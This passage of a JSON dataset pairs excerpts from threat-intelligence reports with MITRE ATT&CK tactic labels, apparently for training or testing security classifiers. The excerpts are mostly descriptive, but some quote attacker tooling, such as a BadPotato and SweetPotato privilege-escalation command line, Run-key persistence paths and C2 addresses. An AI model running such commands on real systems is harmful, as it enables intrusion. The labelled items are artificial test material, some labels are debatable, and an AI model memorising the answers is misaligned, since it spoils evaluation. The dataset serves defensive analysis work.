technique. (https://www.cobaltstrike.com/blog/windows-access-tokens-and-alternate-credentials).",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The malware copies itself to C: \\Users\\User\\AppData\\Roaming\\<INSTALL NAME>. exe and adds this path to HKCU\\Software\\Microsoft \\Windows\\CurrentVersion\\Run. By default the <INSTALL_NAME> is images.exe, but Warzone's builder allows specifying any name of this executable file. \nIt also creates a registryhive HKCUSoftwareMicrosoftWindowsCurrentVersion\\Explorer\\UIF2IS2OVK and puts a pseud-random generated sequence of 256 bytes under the inst value there. \nIf the malware was run without Admin privilege and it hasn't been already terminated by its elevated instance, it copies itself to C: \\ProgramData\\<PREDEFINED NAME> and simply runs itself again from the new location. ",
        "output": "persistence",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Our analysis did not reveal any instances of APT41 using unique ways of escalating privileges in the network. In addition to the standard capabilities of Cobalt Strike, for such purposes APT41 mainly used additional modules and cna. Publicly available tools for local privilege escalation (such as BadPotato) were also used to establish persistence. Moreover, the attackers used password hashes or accounts obtained at the reconnaissance stage. \ncmd.exe /c c:\\windows\\Temp\\BadPotatoNet4.exe c:\\windows\\Temp\\COMSysCon.exe; execute-assembly C:\\Users\\Administrator\\Desktop\\SweetPotato.exe E:\\Projects\\Operations\\uploads\\documents\\docs\\AxInstSV.exe. ",
        "output": "privilege escalation",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In addition to protecting users running Office 365 applications on Windows 10, detections via AMSI allow modern endpoint protection platforms like Windows Defender ATP to extend protection to customers via the cloud. \nIn Windows Defender AV's cloud-delivered antivirus protection, the Office VBA and AMSI integration enriches the signals sent to the cloud, where multiple layers of machine learning models classify and make verdicts on files. When devices encounter documents with suspicious macro code, Windows Defender AV sends metadata and other machine learning features, coupled with signals from Office AMSI, to the cloud. Verdicts by machine learning translate to real-time protection for the rest of Windows Defender AV customers with cloud protection enabled. \nThis protection is also delivered to the rest of Microsoft 365 customers. Through the Microsoft Intelligent Security Graph, security signals are shared across components of Microsoft 365 threat protection. For example, in the case of macro malware, detections of malicious macro-laced documents by Windows Defender AV are shared with Office 365 ATP, which blocks emails carrying the document, stopping attacks before the documents land in users mailboxes. \nWithin a few weeks after the release of this new instrumentation in Office VBA and the adoption by Windows Defender ATP, we saw this multiplier effect, with signals from a few hundred devices protecting several tens of thousands of devices. Because Office AMSI feature exposes behaviors of the macro irrespective of content, language, or obfuscation, signals from one part of the world can translate to protection for the rest of the globe \u2013 this is powerful. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After finishing discovery, the threat actors disconnected from the network dropping both Bazar and Cobalt Strike. We believe the next phase of this attack would have been domain wide ransomware.\nEnjoy our report? Please consider donating $1 or more usingPatreon. Thank you for your support!\nWe also have pcaps, memory captures, scripts, executables, and Kape packages availablehere.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1071 Application Layer Protocol   \nT1071.001 Web Protocols T1071.002 File Transfer Protocols   \nT1071.004 DNS   \nT1090 Proxy   \nT1090.003 Multi-hop Proxy   \nT1095 Non-Application Layer Protocol   \nT1105 Ingress Tool Transfer   \nT1219 Remote Access Software   \nT1571 Non-Standard Port   \nT1572 Protocol Tunneling   \nT1573 Encrypted Channel   \nT1573.002 Asymmetric Cryptography ",
        "output": "command and control",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Fanny creates the following registry value to achieve persistence: HKLM\\System\\CurrentControlSet\\Control\\MediaResources\\acm\\ECELP4\\Driver. \nThis is not a common way to make code start automatically on a system boot and it's extremely invasive, but it guarantees that the module is loaded in the address space of each process in the system, including some critical processes such as lsass.exe and services.exe running as SYSTEM user. \nWhen the module is loaded it checks other values that start from \"filter\" in the same registry key, i.e.: \nHKLM\\System\\CurrentControlSet\\Control\\MediaResources\\acm\\ECELP4\\filter2   \nHKLM\\System\\CurrentControlSet\\Control\\MediaResources\\acm\\ECELP4\\filter3   \nHKLM\\System\\CurrentControlSet\\Control\\MediaResources\\acm\\ECELP4\\filter8 \nThe values contain a hosting process name and a path to a DLL or EXE file. If the current process name contains the value set as hosting process, then the module loads a DLL or starts a new process (in case of EXE file) depending on target file extension. \nThis is a map of the processes and modules that are used in Fanny: ",
        "output": "persistence",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA observed the threat actor using the techniques identified in table 7 to learn more about the victim environments. ",
        "output": "discovery",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After establishing the initial foothold, threat actors deploy multiple techniques to maintain access to the victim environment. As highlighted in \"2021 Year in Review\", scheduled tasks were deployed by threat actors in more than 50% of the intrusions.\nScheduled Tasks:\nSuspicious Scheduled Task Creation to execute LOLbins\nhttps://github.com/The-DFIR-Report/Sigma-Rules/blob/main/suspicious_scheduled_task_creation_to_execute_lolbins.yaml\nRare Scheduled Task Creations\nhttps://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/windows/other/taskscheduler/win_rare_schtask_creation.yml\nBITS Job:\nIn our \"Diavol Ransomware\" case, a new BITS job was created to execute the malicious DLL from mounted ISO image every 3 hours.\nWeb Shells:\nIn the \"Exchange Exploit Leads to Domain Wide Ransomware\" intrusion, multiple web shells were dropped on the infected Microsoft Exchange system. These shells were later used for performing discovery activity.\nSigma Rules:\nWebshell Detection With Command Line Keywords\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_webshell_detection.yml\nShells Spawned by Web Servers\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_webshell_spawn.yml\nExchange Webshell creation\nhttps://github.com/The-DFIR-Report/Sigma-Rules/blob/main/exchange_webshell_creation\nRemote Access Tools:\nA recent trend by the threat actor, once a foothold has been established, is to maintain long term persistence using third party remote services, such as those provided via Splashtop, AnyDesk, NetSupport, etc.\nFrom a recent case (illustration below), Splashtop was deployed, and provided the operator with access to the network using legitimate services. As this is a remote service, there will be a mix of process and network activity that should be very visible.\nWe've created two Sigma rules for Splashtop covering both process creation and network activity. Splashtop is a legitimate application, however it should be investigated if its not part of your software baseline.\nBoth process and network events will be detected:\nSimilarly, the AnyDesk Sigma rule also covers network activities.\nOur SplashTop and AnyDesk Sigma rules can be found within our GitHub repo at:\nAnyDesk Network:\nhttps://github.com/The-DFIR-Report/Sigma-Rules/blob/main/win_network_anydesk.yml\nSplashTop Network\nhttps://github.com/The-DFIR-Report/Sigma-Rules/blob/main/win_network_splashtop.yml\nSplashTop Process:\nhttps://github.com/The-DFIR-Report/Sigma-Rules/blob/main/win_software_splashtop.yml",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The following C2 IP-addresses/domains belonging to Qbot were recorded during this intrusion:\nThe (default) named pipepostex_4c14was observed from a Cobalt Strike injected explore.exe process.\nAfter dumping one of the injected explorer.exe processes, we were able to extract the beacon configuration using the1768.pytool, by Didier Stevens.\nMore details about this IP-address:\nCobalt Strike config:\nThe remote admin tool named client32.exe (NetSupport Manager) and its associated libraries were dropped on a workstation in theC:\\ProgramData\\MSN Devicesdirectory.\nThe exchanged network traffic was unencrypted and contained the custom user-agentNetSupport Manager/1.3\nThe threat actor installed and enabled the Atera RMM agent on the domain controller.\nThe MSI installer, namedsetup_undefined.msiwas configured to drop the installation files in theC:\\Program Files\\ATERA Networks\\AteraAgentdirectory.\nAtera integrated with another remote admin tool known as \"SplashTop\", which it dropped on the file system.\nPeriodic 'heartbeat' process events of Atera were observed:\nThe \"Splashtop\" remote admin tool was started as a background process.\nBoth remote admin tools allowed the threat actors to persist and obtain remote access to the environment, without relying on RDP.\nThe Atera Agent account used was retained in the host Software registry hive:",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Mandiant has previously assessed with high confidence that UNC4841 conducts espionage activity in support of the People's Republic of China. Our assessment has not changed and has now been corroborated by independent assessments from government agencies. As we mentioned in our first blog post, several overlaps with other Chinanexus actors have been identified throughout our investigation. However, Mandiant has not attributed activity tracked as UNC4841 to a previously known threat actor. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial access was facilitated through a single Remote Desktop Protocol (RDP) connection from an IP address geo-located in Ukraine. While it's challenging to pinpoint the actor's initial access method due to limited evidence, the absence of brute force attempts and the use of valid credentials suggest that the threat actor may have obtained the domain Administrator password, potentially through leakage or purchase, particularly considering other external access events in the weeks leading up to the intrusion.\nThe initial RDP connection was a single event ID 4624 log (successful login). It was also a type 7 logon suggesting that the Administrator account had an open session which was unlocked. This is usually the result of disconnecting the session without fully signing out. This is corroborated with event ID 4778 reporting a resumed session for the user and IP address.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Throughout the intrusion, we observed multiple instances of process injection  from both the initial BazarLoader malware and Cobalt Strike beacons.\nAfter BazarLoader was loaded in memory, almost immediately it injected into svchost.exe process. Additionally, the Cobalt Strike beacon was injected into mstsc.exe, searchindexer.exe and rundll32.exe and run various tasks from these processes.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor's ongoing development of DNSpionage malware shows that the attacker continues to find new ways to avoid detection. The oddities we mentioned are certainly not normal, but the payload was clearly updated to attempt to remain more elusive. DNS tunneling is a popular method of exfiltration for some actors and recent examples of DNSpionage show that we must ensure DNS is monitored as closely as an organization's normal proxy or weblogs. DNS is essentially the phonebook of the internet, and when it is tampered with, it becomes difficult for anyone to discern whether what they are seeing online is legitimate. The discovery of Karkoff also shows the actor is pivoting and is increasingly attempting to avoid detection while remaining very focused on the Middle Eastern region. Cisco Talos will continue to monitor for activity from this actor and ensure our protection and detection capabilities continue to prevent such advanced attacks on our customers. \nCoverage \nAdditional ways our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. Below is a screenshot showing how AMP can protect customers from this threat. \nCisco Cloud Web Security (CWS) orWeb Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks. \nEmail Security can block malicious emails sent by threat actors as part of their campaign. \nNetwork Security appliances such asNext-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), and Meraki MX can detect malicious activity associated with this threat. \nAMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. \nOpen Source SNORT\u24c7 Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nIndicators of Compromise (IOCs) \nThe following IOCs are associated to this campaign: \nDNSpionage XLS document ",
        "output": "other",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: XorDdos' modular nature provides attackers with a versatile trojan capable of infecting a variety of Linux system architectures. Its SSH brute force attacks are a relatively simple yet effective technique for gaining root access over a number of potential targets. \nAdept at stealing sensitive data, installing a rootkit device, using various evasion and persistence mechanisms, and performing DDoS attacks, XorDdos enables adversaries to create potentially significant disruptions on target systems. Moreover, XorDdos may be used to bring in other dangerous threats or to provide a vector for follow-on activities. \nXorDdos and other threats targeting Linux devices emphasize how crucial it is to have security solutions with comprehensive capabilities and complete visibility spanning numerous distributions of Linux operating systems. Microsoft Defender for Endpoint offers such visibility and protection to catch these emerging threats with its next-generation antimalware and endpoint detection and response (EDR) capabilities. Leveraging threat intelligence from integrated threat data, including client and cloud heuristics, machine learning models, memory scanning, and behavioral monitoring, Microsoft Defender for Endpoint can detect and remediate XorDdos and its multi-stage, modular attacks. This includes detecting and \nRise in XorDdos: A deeper look at the stealthy DDoS malware targeting Linux devices | Microsoft Security Blog protecting against its use of a malicious shell script for initial access, its drop-andexecution of binaries from a world-writable location, and any potential follow-on activities on endpoints. \nDefenders can apply the following mitigations to reduce the impact of this threat: \nEncourage the use of Microsoft Edge-available on Linux and various platforms-or other web browsers that support Microsoft Defender SmartScreen, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that contain exploits and host malware. Use device discovery to find unmanaged Linux devices on your network and onboard them to Microsoft Defender for Endpoint. Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to use cloud-based machine learning protections that can block a huge majority of new and unknown variants. Run EDR in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus doesn't detect the threat or when Microsoft Defender Antivirus is running in passive mode. Enable network protection to prevent applications or users from accessing malicious domains and other malicious content on the internet. Enable investigation and remediation in full automated mode to allow Microsoft Defender for Endpoint to take immediate action on alerts to resolve breaches, significantly reducing alert volume. \nAs threats across all platforms continue to grow in number and sophistication, security solutions must be capable of providing advanced protection on a wide range of devices, regardless of the operating system in use. Organizations will continue to face threats from a variety of entry points across devices, so Microsoft continues to heavily invest in protecting all the major platforms and providing extensive capabilities that organizations needed to protect their networks and systems. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Although this malware is still a work in progress, the fact that it has a fully functional WordPress brute forcer combined with its anti-bot evasion techniques makes it a threat to watch for-especially with the immense popularity of the WordPress CMS, which powers millions of websites globally.\nBrute-forcing campaigns are dangerous as they may lead to server compromise and malware deployment. To mitigate this risk, website administrators should ensure that user accounts (especially administrator accounts) use strong passwords. Keeping the CMS software and associated plugins up to date also reduces the risk of malware infection by exploiting unpatched vulnerabilities.\nFortiGuard Labs will continue to monitor GoTrim's development.",
        "output": "other",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: For lateral movement the threat actors relied heavily on copying executable files over SMB and then executing them via remote WMIC calls\nWhile executables and wmic were the preferred options for the threat actor, they did employ several other techniques.\nRemote Cobalt Strike beacons were started with services and PowerShell several times in the environment.\nDuring the final stages the threat actor used RDP to move between a few servers as part of their final actions.\nAt that time, a Cobalt Strike beacon executable was executed as a service on a remote host for testing the final ransom deployment.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Keeping it simple was the name of the game for this threat actor. Remote Desktop Protocol (RDP) was all that was necessary to facilitate the exfiltration of data and successful execution of ransomware. Using the beachhead as a pivot point, several RDP connections were initiated to high value targets such as file and backup servers.\nSuccessful RDP connections to hosts on the network\nLike with many other batch scripts already reviewed, openrdp.bat was another script that was part of the threat actor toolkit that did not see execution during this intrusion as RDP access was readily available across the environment. However this script would likely be used in the event of the threat actor operating in a more restricted environment.\nopenrdp.bat\nAnother tool (presumably to be used for lateral movement) dropped by the threat actor, but not employed in this incident, is a tool namedRemote Desktop Plus. Remote Desktop Plus is a RDP client with many options for session management and command line options. The version dropped was v4.0 originally released in 2012. From the tools website:",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1059: Command and Scripting Interprete   \nT1059.001: PowerShell   \nT1059.003: Windows Command Shell   \nT1059.004: Unix Shell ",
        "output": "execution",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1016: System Network Configuration Discovery T1083: File and Directory Discovery ",
        "output": "discovery",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While the previous Turla campaigns were designed to target Windows-based machines, the campaign in August 2014  was the first instance where Turla targeted the Linux operating system. Dubbed asPenguin Turla, the group used a Linux Turla module with a C/C++ executable statically linked against multiple libraries, greatly increasing its file size for this campaign.",
        "output": "other",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1007: System Service DiscoveryT1010: Application   \nWindow DiscoveryT1012: Query RegistryT1016:   \nSystem Network Configuration DiscoveryT1033:   \nSystem Owner/User DiscoveryT1049: System   \nNetwork Connections DiscoveryT1057: Process   \nDiscoveryT1069: Permission Groups   \nDiscoveryT1069.001: Local GroupsT1069.002:   \nDomain GroupsT1082: System Information   \nDiscoveryT1083: File and Directory DiscoveryT1087:   \nAccount DiscoveryT1087.001: Local   \nAccountT1087.002: Domain AccountT1482: Domain   \nTrust DiscoveryT1518: Software DiscoveryT1614.001:   \nSystem Language Discovery \nLateral Movement \nT1021.001: Remote Desktop ProtocolT1021.002:SMB/Windows Admin SharesT1021.004: SSH\nExfiltration \nT1020: Automated Exfiltration \nExecution \nT1047: Windows Management InstrumentationT1053: Scheduled Task/JobT1053.005: Scheduled TaskT1059: Command and Scripting InterpreterT1059.001: \nTo HADES and Back: UNC2165 Shifts to LOCKBIT to Evade Sanctions | Mandiant | Google Cloud Blog PowerShellT1059.003: Windows Command ShellT1059.005: Visual BasicT1059.007: JavaScriptT1569.002: Service Execution ",
        "output": "discovery",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: SideWinder has been observed initiating attacks with spear phishing emails against their target organizations. Attacks are primarily delivering malicious attachments, but credential phishing has also been a technique used by the group. The December 2020 blog from Trend Micro does an excellent analysis of the phishing websites. Ultimately, these websites are used to collection credentials and occasionally deliver similar files to the attachments detailed below. \nEmail lures and their attachments or links are often uniquely crafted to the target organization, which include content that the recipients would often expect to receive or benefit from reading. Since the group has primarily targeted government and military organizations, email lures are often related to political events and/or private documents generally considered standard for such organizations to receive. Figure 1 includes a screenshot of the complete content from an April 2019 campaign phishing email (SHA256: \nbe71f2d17037a1a1fbbe8d7f3f4b45c72132a64224e3d3f13aa66a2249df9232) with attachment (SHA256: ac4fd2681c3a9d087ff4cabb44b93753711e81c6574c837ca33f74fef37f3cf4). \nMalicious attachments are the standard approach over the use of malicious links in phishing emails.   \nAttachments have most commonly been RTF files, and less commonly DOCX, LNK, and ZIP files. ",
        "output": "initial access",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: DEV-0270 can usually obtain initial access with administrator or system-level privileges by injecting their web shell into a privileged process on a vulnerable web server. When the group uses Impacket's WMIExec to move to other systems on the network laterally, they are typically already using a privileged account to run remote commands. DEV-0270 also commonly dumps LSASS, as mentioned in the credential access section, to obtain local system credentials and masquerade as other local accounts which might have extended privileges. \nAnother form of privilege escalation used by DEV-0270 involves the creation or activation of a user account to provide it with administrator privileges. DEV-0270 uses powershell.exe and net.exe commands to create or enable this account and add it to the administrators' group for higher privileges. ",
        "output": "privilege escalation",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: For the final actions, the threat actors dropped a ransomware executable on the domain controller in C:\\Windows and then used BITSAdmin to deploy the executable to remote systems.\nThe -smode flag was used with the ransomware executable to set the system to reboot into Safe Mode with Networking as noted byMalwarehunterteam.\nSee below for -smode execution:\nThe *franceisshit key was used to boot the machine out of Safe Mode upon restarting the machine.\nThe systems rebooted into Safe Mode with Networking after running this smode command and were left at a login screen. About 10-20 seconds after logging in, all user files were encrypted and a ransom note was placed in numerous locations including the Desktop. Services were not able to be started, which led to collection issues, as normal agents did not start. This also included the startup of EDR and management agents.\nWe've seen at least one tweet about smode setting auto login keys, but we did not see that in our case and were not able to recreate that situation.\nAfter rebooting out of Safe Mode, you are left with the following desktop:\nOn certain systems, like the domain controllers, the threat actors chose to not use the Safe Mode option, and instead they used a dll executed by rundll32 to encrypt the system with no reboot, allowing the threat actors to maintain access while the ransomware was encrypting files.\nThe threat actors asked for 200k in Monero. They were talked down 20-30% and could have been talked down more. Here's a few screenshots from the website.\nWith the help of@hatching_io(https://tria.ge/)we were able to parse the config from the ransomware sample.\nList of processes to kill (prc)\nList of services to kill\nTriagesandbox run of the executable without smode:",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: RDP\nThe threat actor was observed using RDP during the intrusion. In the first two days, they leveraged a file server as a pivot host. On the final day, RDP sessions were initiated from the beachhead host to both a file server and a backup server.\nAuthentication data from normal 4624 events was absent from the data collected, but using Microsoft-Windows-TerminalServices-LocalSessionManager eventID 21 logs, we were able to identify the logon activity.\nWinRM\nDuring the first day, the threat actor started a remote PowerShell session from the file server to a domain controller using WinRM. This session was then used to run Active Directory discovery commands. This was logged in Windows PowerShell logs eventID's 4103/4104.\nLocal Host:\nRemote Host:\nWMI\nThe threat actors used the /node option to run a remote command on a backup server and later during ransomware deployment, this is covered further in theDefense EvasionandImpactsections.\nPsexec\nSystinternal's Psexec was used by the threat actor for remote execution activity related to the ransomware deployment, referred to in theImpactsection.\nRemote Service/SMB\nThe threat actors repeatedly leveraged remote services to facilitate lateral movement within the network. Their activity began with the deployment of SystemBC and GhostSOCKS proxy tools to a domain controller.\nThe following data illustrates SMB network activity used to transfer the proxy tools to the domain controller:\nRemote service creation:\nThis kind of remote service creation can also be identified over the network with IDS detections such as ET RPC DCERPC SVCCTL  Remote Service Control Manager Access.\nLater they used the jump psexec_psh feature of Cobalt Strike to execute PowerShell beacons on a file share server and backup server via remote services.\nAfter initial Base64 decoding, we found the payload used the default Cobalt Strike XOR value of 35.\nAfter decoding the second layer of obfuscation using the XOR key 35, we have the next layer of base64 strings. We can use the XOR key 35 to decode this again. As our next step, we can use the cyber chef recipe below.\nThe PowerShell is base64 encoded. Decoding the PowerShell shows that the SMB pipe is named:\nUpon analyzing the output with Didier Stevens'1768.pyscript, the findings revealed a match to Cobalt Strike shellcode associated with psexec_psh activity.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On day 1 the threat actors checked a domain controller for MS17-010 before continuing with more discovery. The system was not vulnerable to MS17-010\nLateral movement began around 28 hours after initial entry, using SMB to drop a Cobalt Strike Beacon on a domain controller. From there, the threat actor used WMIC to execute the beacon.\nThis payload did not appear to run successfully, as shortly after the threat actors dropped an additional payload on the beachhead host, and then executed a service on the DC, after no command and control traffic was apparent.\nThe decoded Powershell.\nFollowing this, the treat actors copied and executed a Cobalt Strike beacon executable and initiated it via a service on the domain controller.\nAt this point, C2 connections appear on the domain controller connecting tomartahzz[.]com 88.119.171[.]75 over 443/https.\nBackup systems were targeted for lateral movement using the SMB exe executed around one hour after the first lateral movement execution from the beachhead host.\nThe threat actor was having issues running beacons on numerous systems, and on at least one of the systems, they mounted the drive remotely.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Two and a half days later, the attackers signed into one of the target devices they found during their initial discovery efforts using compromised credentials via interactive sign-in. They opted for a credential theft technique that didn't require dropping a file like Mimikatz that antivirus products might detect. Instead, they opened Taskmgr.exe, created a dump file of the LSASS.exe process, and saved the file to a ZIP archive. \nThe attackers continued their previous discovery efforts using a PowerShell script version of ADRecon (ADRecon.ps1), which is a tool designed to gather extensive information about an Active Directory (AD) environment. The attacker followed up this action with a net scanning tool that opened connections to devices in the organization on server message block (SMB) and remote desktop protocol (RDP). For discovered devices, the attackers attempted to navigate to various network shares and used the Remote Desktop client (mstsc.exe) to sign into these devices, once again using the compromised account credentials. \nThese behaviors continued for days, with the attackers signing into numerous devices throughout the organization, dumping credentials, and determining what devices they could access. ",
        "output": "lateral movement",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors made use of process injection through-out the intrusion. The BazaLoader malware injected into an Edge browser process, as observed by the discovery activity, and Cobalt Strike DLL's activity.\nCobalt Strike processes were also observed injecting into various other processes.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Masquerading\nOne of the simpler ways that IcedID attempted to evade detection was by naming the malware DLL file as COIm.jpg. Renaming a DLL file extension to a commonly ignored graphics file type, such as jpg, gif, or png, is a simple example ofMasquerading, MITRE Technique T1036.008, and represents an excellent opportunity for acustom detection.\nThe threat actor was observed using common Windows process names for other tooling used during the intrusion, including:\ncsrss.exefor a Cobalt Strike beacon downloaded from91.215.85[.]183/download/csrss.exe \nsvchost.exefor the ransomware payload deployed to systems.\nProcess Injection\nUpon execution of a Cobalt Strike beacon, process injection into asvchost.exeprocess was observed. In this case, process injection was conducted by writing into a remote process and executing the code via a remote thread.\nsvchost.exewas subsequently observed executing multiple different commands related to discovery and enumeration.\nSince the discovery commands involved executing scripts viacmd.exe, the anomalous parent child relationship betweensvchost.exeandcmd.exewas observed on the system from a memory dump.\nIndicator Removal\nFileZilla, installed by the threat actors for exfiltration activity, was observed being manually uninstalled by the threat actors during the final ransomware deployment period.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ProxyShell exploitation provided the threat actors with NT AUTHORITY\\SYSTEM privileges. Those privileges allowed them to enable the DefaultAdmin account to get access to the Mail Server using valid credentials. Moreover, the threat actors managed to dump LSASS and steal a domain administrator account, which was used to perform lateral movement.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Snatch Team logged into a DA account from 193.70.12.240 around 0515 UTC. Initially with that access they performed a simple arp -a.\nAt 0753 UTC the threat actors made the next move running ipconfig and quser. Just minutes later they began lateral movement initiating an RDP session with a DC.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Unit 42 researchers observed Royal ransomware operators using PowerTool. This is a piece of software that has access to the kernel and is ideal for removing endpoint security software. They also executed batch scripts to disable security-related services, and deleted shadow file copies and logs after successful exfiltration.",
        "output": "defense evasion",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
